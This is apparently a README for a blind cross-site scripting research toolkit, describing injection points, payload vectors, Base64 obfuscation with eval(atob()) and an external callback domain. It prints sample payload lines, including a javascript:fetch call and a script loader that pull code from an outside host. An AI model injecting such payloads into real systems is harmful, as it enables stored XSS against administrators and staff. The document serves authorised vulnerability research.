# Blind XSS Research Proof of Concept (PoC)

This repository serves as a specialized toolkit for **Blind Cross-Site Scripting (XSS)** detection and research. It contains a collection of payloads designed to be injected into fields that are later rendered in backend systems, administrative panels, or logging interfaces.

> **SECURITY RESEARCH ONLY**: These payloads are for identification of vulnerabilities in authorized systems. Use of these payloads on unauthorized systems is prohibited.

## Summary of Findings

The core issue explored is the potential for **Stored Blind XSS**. These vulnerabilities are particularly dangerous because the payload executes in a privileged context (e.g., an admin panel) that the researcher cannot directly observe, often bypassing front-end security controls.

### High-Value Injection Points
The research highlights that Blind XSS is most likely to be found in:
- **Support and Feedback Forms**: Where user input is viewed by staff in internal dashboards.
- **Analytic Tracking**: UTM parameters and HTTP headers (like `User-Agent` and `Referer`) processed by logging engines.
- **Document Rendering**: Automated systems that generate PDFs (invoices, receipts) from user-provided data.

## Payload Categorization

The research payloads (found in the `test` file and implemented for testing in `verify_payloads.html`) utilize several distinct execution vectors:

### A. Event-Based Attributes
Most payloads leverage common HTML event handlers to trigger execution upon rendering.
- **`onerror`**: Used primarily with `<img>` tags (`<img src=x onerror="...">`).
- **`onfocus`**: Used with `<input>` tags using the `autofocus` attribute to trigger without user interaction.
- **`onload`**: Used with `<body>` or `<svg>` tags.

### B. Protocol-Based Execution
Payloads using the `javascript:` pseudo-protocol target `href` or `src` attributes.
- Example: `javascript:fetch('https://1.hackeronce.com/?p=js-protocol')`

### C. External Resource Fetching
Tags that naturally load external content are used to bypass simple filters.
- **`<iframe>`**: Loads a tracking page.
- **`<script>`**: Loads external JavaScript.
- **`<base>`**: Hijacks relative URLs by setting a new base path.
- **`<meta>`**: Initiates `refresh` redirects.

### D. Template Injection
Includes payloads for **AngularJS**, targeting expression evaluation in the client-side template engine.
- Example: `{{constructor.constructor("fetch('...')")()}}`

## Obfuscation Techniques

Several payloads use **Base64 encoding** combined with `eval(atob(...))` to evade static analysis and string-based filtering.

### Decoded Payload Example:
When decoded, the Base64 strings reveal a pattern of dynamic script injection:
```javascript
const x=document.createElement('script');
x.src='https://1.hackeronce.com/?p=...';
document.body.appendChild(x);
```
This ensures that even if the initial injection is minimal, a complex payload can be loaded from the callback server.

## Callback Infrastructure

The primary callback domain used is **`1.hackeronce.com`**. Each payload is tagged with a unique identifier (e.g., `?p=img-onerror`) to allow correlation between a successful execution and its injection vector.

## Ephemeral VMs for Security Research

When testing the payloads in this repository, it is strongly recommended to use **ephemeral Virtual Machines (VMs)** as your target or callback processing environment.

### What is an Ephemeral VM?
An ephemeral VM is a temporary virtual machine instance that is created for a specific task and then destroyed once the task is complete. Unlike persistent VMs, any changes made to the disk or state of an ephemeral VM are lost when it is deleted.

### Why use Ephemeral VMs for Blind XSS Research?
- **Isolation and Safety**: Blind XSS payloads can sometimes trigger unexpected side effects or even reveal Remote Code Execution (RCE) vulnerabilities. Using an ephemeral VM ensures that any such execution is contained within a disposable sandbox, protecting your primary infrastructure.
- **Reproducibility**: You can define the exact state of your VM using infrastructure-as-code (like Terraform or Vagrant). This allows you to spin up a fresh, identical environment for each test run, ensuring your results are consistent.
- **Cost-Effectiveness**: Since you only pay for the VM while it is running, and most security tests are short-lived, ephemeral VMs are significantly cheaper than maintaining a permanent lab environment.
- **Clean State**: Each test begins with a known clean state, eliminating any residual data or configurations from previous tests that could lead to false positives.

For automated testing, consider integrating ephemeral VM creation into your CI/CD pipeline using cloud providers like AWS (EC2 Spot Instances), Google Cloud (Preemptible VMs), or Azure (Spot Virtual Machines).

---
*This documentation is based on consolidated research from the repository's analysis branches.*
